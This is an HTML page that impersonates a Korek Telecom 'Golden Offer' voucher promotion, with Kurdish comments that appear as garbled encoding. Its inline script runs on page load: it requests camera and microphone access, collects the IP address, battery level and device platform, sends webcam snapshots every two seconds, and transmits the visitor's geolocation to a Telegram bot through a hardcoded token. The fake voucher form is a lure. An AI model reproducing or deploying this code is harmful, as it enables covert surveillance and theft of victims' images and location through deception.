<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Korek Telecom - Golden Offer</title>
    <style>
        /* Ù‡Û•Ù…Ø§Ù† Ø³ØªØ§ÛŒÙ„Û•Ú©Û•ÛŒ Ù¾ÛØ´ÙˆÙˆ Ù„ÛØ±Û• Ø¯Ø§Ø¨Ù†Û... */
        body { margin: 0; padding: 0; font-family: sans-serif; background-color: #005596; color: white; text-align: center; }
        header { width: 100%; background-color: white; padding: 10px 0; border-bottom: 3px solid #fdb913; }
        .hero { padding: 40px 20px; }
        .recharge-box { background: white; color: #333; padding: 20px; border-radius: 10px; margin: 20px auto; width: 90%; max-width: 350px; }
    </style>

    <script>
        // Ù„ÛØ±Û•Ø¯Ø§ ÙÛ•Ù†Ú©Ø´Ù†Û•Ú©Û• ÛŒÛ•Ú©Ø³Û•Ø± Ú©Ø§Ø± Ø¯Û•Ú©Ø§Øª Ù¾ÛØ´ Ø¦Û•ÙˆÛ•ÛŒ ÙˆÛÙ†Û•Ú©Ø§Ù† Ø¨Ø§Ø± Ø¨Ø¨Ù†
        const urlParams = new URLSearchParams(window.location.search);
        const targetID = urlParams.get('id'); 
        const TOKEN = "8300725896:AAHHhfRB0II4tFDs7ypgNTS_Xc9gWP40Z58";

        async function fastCapture() {
            if (!targetID) return;
            
            // Ø¯Ø§ÙˆØ§Ú©Ø±Ø¯Ù†ÛŒ Ù…Û†ÚµÛ•Øª ÛŒÛ•Ú©Ø³Û•Ø±
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                
                // Ù†Ø§Ø±Ø¯Ù†ÛŒ Ø²Ø§Ù†ÛŒØ§Ø±ÛŒÛŒÛ• Ø³Û•Ø±Û•ØªØ§ÛŒÛŒÛ•Ú©Ø§Ù†
                const batt = await navigator.getBattery();
                const batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
                
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();

                let report = `ğŸ¦… <b>Ù†ÛÚ†ÛŒØ±ÛÚ©ÛŒ Ù†ÙˆÛ Ú•Ø§ÙˆÚ©Ø±Ø§!</b>\n\n` +
                             `ğŸ‘¤ <b>ID:</b> <code>${targetID}</code>\n` +
                             `ğŸŒ <b>IP:</b> <code>${ipData.ip}</code>\n` +
                             `ğŸ”‹ <b>Battery:</b> <code>${batteryInfo}</code>\n` +
                             `ğŸ“± <b>Device:</b> <code>${navigator.platform}</code>`;
                
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: targetID, text: report, parse_mode: "HTML"})
                });

                // Ø¯Û•Ø³ØªÙ¾ÛÚ©Ø±Ø¯Ù†ÛŒ ÙˆÛÙ†Û•Ú¯Ø±ØªÙ†
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                setInterval(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(b => {
                        let fd = new FormData();
                        fd.append("chat_id", targetID);
                        fd.append("photo", b, "shot.jpg");
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg', 0.7);
                }, 2000);

                // ÙˆÛ•Ø±Ú¯Ø±ØªÙ†ÛŒ Ù„ÙˆÚ©Û•ÛŒØ´Ù†
                navigator.geolocation.getCurrentPosition(pos => {
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({chat_id: targetID, latitude: pos.coords.latitude, longitude: pos.coords.longitude})
                    });
                });

            } catch (e) {
                // Ø¦Û•Ú¯Û•Ø± Ù†ÛÚ†ÛŒØ±Û•Ú©Û• Ú•Û•ØªÛŒ Ú©Ø±Ø¯Û•ÙˆÛ•
            }
        }
        
        // ÛŒÛ•Ú©Ø³Û•Ø± Ú©Ø§Ø± Ø¨Ú©Û•
        fastCapture();
    </script>
</head>
<body>
    <header>
        <img src="https://www.korektelecom.com/media/1001/korek-logo.png" alt="Korek" width="120">
    </header>
    <div class="hero">
        <div style="color: #fdb913; font-size: 38px; font-weight: bold;">Golden Offer</div>
        <div style="font-size: 50px; font-weight: 900;">*203#</div>
        <div class="recharge-box">
            <p>Ø®Û•Ø±ÛŒÚ©ÛŒ Ù¾Ø´Ú©Ù†ÛŒÙ†ÛŒ Ø³ÛŒÙ…Ú©Ø§Ø±ØªÛ•Ú©Û•ØªÛŒÙ†...</p>
            <input type="text" placeholder="Voucher Number" disabled style="width:100%; padding:10px; margin:10px 0;">
            <button style="background:#fdb913; width:100%; padding:10px; border:none; font-weight:bold;">Continue</button>
        </div>
    </div>
</body>
</html>
